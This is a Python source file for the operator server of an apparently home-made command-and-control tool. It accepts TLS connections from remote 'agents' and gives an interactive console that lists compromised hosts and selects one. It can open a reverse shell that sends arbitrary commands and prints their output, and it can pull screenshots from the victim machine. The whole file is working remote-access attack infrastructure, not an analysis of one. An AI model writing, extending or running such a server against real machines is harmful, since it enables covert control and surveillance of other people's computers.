import socket
import threading
import ssl
import secrets

class Agent:
    def __init__(self, conn, sock, id):
        self.ip = conn[0]
        self.port = conn[1]
        self.sock = sock
        self.id = id

    def __str__(self):
        return f"[{self.id}] Agent: {self.ip}:{self.port}"

class Server:
    def __init__(self, address, port):
        self.address = address
        self.port = port
        self.agents = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.current_id = 1
        self.server_stop = False
        self.current_session = 0

        self.commands = {
            'exit': {
                'function': self.exit,
                'description': 'Exit the server.'
            },
            'agents': {
                'function': self.displayAgents,
                'description': 'List all connected agents.'
            },
            'agent': {
                'function': self.agent,
                'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
            },
            'shell': {
                'function': self.shell,
                'description': 'Open a reverse shell from the selected agent.'
            },
            'screenshot': {
                'function': self.screenshot,
                'description': 'Take a screenshot from the selected agent.'
            },
            'bg': {
                'function': self.bg,
                'description': 'Deselect the current agent.'
            },
            'help': {
                'function': self.help,
                'description': 'Show this help message.'
            }
        }


    def __str__(self):
        return f"Server: {len(self.agents)} agents connected"

    def addAgent(self, agent: 'Agent'):
        self.agents.append(agent)

    def help(self, args):
        print("\nAvailable Commands:")
        print("=" * 20)
        for cmd, info in self.commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20)
        print("Usage:")
        print("  command [args]\n")

    def handleClient(self, agent):
        agent.sock.sendall("Welcome agent\n".encode())

    def acceptConnections(self):
        while not self.server_stop:
            client_socket, client_address = self.sock.accept()
            try:
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                agent = self.newAgent(client_address, client_socket)
                threading.Thread(target=self.handleClient, args=(agent,)).start()
            except ssl.SSLError as e:
                print(f"SSL error: {e}")

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((self.address, self.port))
        print(self)
        self.sock.listen(5)
        
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
        
        threading.Thread(target=self.acceptConnections).start()

    def main_loop(self):
        while True:
            active_agent = f"[{len(self.agents)} active]" if self.current_session == 0 else f"[Agent {self.current_session}]"
            command = input(f"{active_agent}> ").strip()

            if command:
                command_name, *args = command.split(' ')
                if command_name in self.commands:
                    self.commands[command_name]['function'](' '.join(args))
                else:
                    print(f"Unknown command: {command_name}")

    def exit(self, args):
        self.closeAllConn()
        self.server_socket.close()
        self.server_stop = True
        exit(0)

    def displayAgents(self, args):
        if self.agents:
            print("\nConnected Agents:")
            print("=" * 50)
            print(f"{'ID':<5}{'IP Address':<20}{'Port':<10}")
            print("-" * 50)
            for agent in self.agents:
                print(f"{agent.id:<5}{agent.ip:<20}{agent.port:<10}")
            print("=" * 50)
        else:
            print("No agents connected")

    def agent(self, args):
        try:
            if int(args) > len(self.agents):
                print("Invalid agent ID")
            else:
                self.current_session = int(args)
        except ValueError:
            print("Agent ID needs to be an Integer")

    def shell(self, args):
        if self.current_session > 0:
            agent = self.agents[self.current_session - 1]
            agent.sock.sendall("shell".encode())
            while True:
                command = input('$> ').strip()
                if command == '':
                    continue
                if command.lower() == 'exit':
                    break
                agent.sock.sendall(command.encode())
                print(agent.sock.recv(8192).decode('latin1'))

    def screenshot(self, args):
        if self.current_session > 0:
            agent = self.agents[self.current_session - 1]
            agent.sock.sendall("screenshot".encode())
            screen_path = f"{secrets.token_hex(5)}.jpg"
            with open(screen_path, 'wb') as f:
                while True:
                    data = agent.sock.recv(1024)
                    if data.decode("latin1") == "EOF":
                        break
                    f.write(data)
            print(f'Image received and saved at {screen_path}')
        else:
            print("Please select an agent")

    def bg(self, args):
        self.current_session = 0

    def closeAllConn(self):
        for agent in self.agents:
            agent.sock.close()

    def newAgent(self, client_address, client_socket):
        agent_id = self.current_id
        self.current_id += 1
        agent = Agent(client_address, client_socket, agent_id)
        print(f"New connection:\n{agent}")
        self.addAgent(agent)
        return agent